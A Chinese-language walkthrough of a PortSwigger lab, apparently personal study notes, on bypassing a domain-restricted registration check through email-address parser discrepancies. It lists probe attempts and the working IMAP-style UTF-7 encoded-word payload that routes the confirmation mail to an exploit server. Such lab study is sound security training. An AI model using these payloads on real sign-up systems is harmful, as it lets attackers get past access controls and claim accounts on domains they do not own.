# 实验：利用电子邮件地址解析差异绕过访问控制

https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-bypassing-access-controls-using-email-address-parsing-discrepancies

本实验会验证电子邮件地址，以防止攻击者注册来自未授权域名的地址。在用于解析电子邮件地址的验证逻辑和库之间存在解析器差异（parser discrepancy）。

为了解决本实验，请利用此缺陷注册一个账户并删除 `carlos`。

> **所需知识**
> 要解决此实验，你需要理解 PortSwigger 研究团队的 Gareth Heyes 在其白皮书[《Splitting the Email Atom: Exploiting Parsers to Bypass Access Controls》（拆分电子邮件原子：利用解析器绕过访问控制）](https://portswigger.net/research/splitting-the-email-atom)中描述的技术。

## 步骤

探测注册功能
- 注册界面提示
    `If you work for GinAndJuice, please use your @ginandjuice.shop email address`

- 尝试注册普通账户
    `Only emails with the ginandjuice.shop domain are allowed`

尝试注册邮件地址被识别为目标域名 `@ginandjuice.shop` 的账户
- `abc%exploit-id.exploit-server.net@ginandjuice.shop`
    - 无效

尝试编码邮件格式
- `=?iso-8859-1?q?=61=62=63?=TEST@ginandjuice.shop`
    - 被拦截

- `=?utf-8?q?=61=62=63?=TEST@ginandjuice.shop`
    - 被拦截

- `=?utf-7?q?ABC?=TEST@ginandjuice.shop`
    - 通过

- `=?utf-8?b?QUJD?=TEST@ginandjuice.shop`
    - 通过

- `=?utf-7?b?QUJD?=TEST@ginandjuice.shop`
    - 通过



- `=?x?q?ABC=40exploit-id.exploit-server.net=3e=00?=foo@ginandjuice.shop`
    - 被拦截
- `=?utf-7?q?ABC+AEA-exploit-id.exploit-server.net+AD4-?=foo@ginandjuice.shop`
    - 通过，空字节

- `=?utf-7?q?ABC+AEA-exploit-id.exploit-server.net+AD4AXw-?=foo@ginandjuice.shop`
    - 通过，下划线


各种尝试均失败，查看示例解决方案
- 载荷
    ```log
    =?utf-7?q?ABC&AEA-exploit-id.exploit-server.net&ACA-?=TEST@ginandjuice.shop
    ```
    - 使用 `&-` 格式的 IMAP 邮件版 UTF-7 编码，而不是研究文章中的 `+-` 普通 UTF-7 格式。见 [RFC 3501](https://datatracker.ietf.org/doc/html/rfc3501#section-5.1.3)
    - `&ACA-` 对应空格
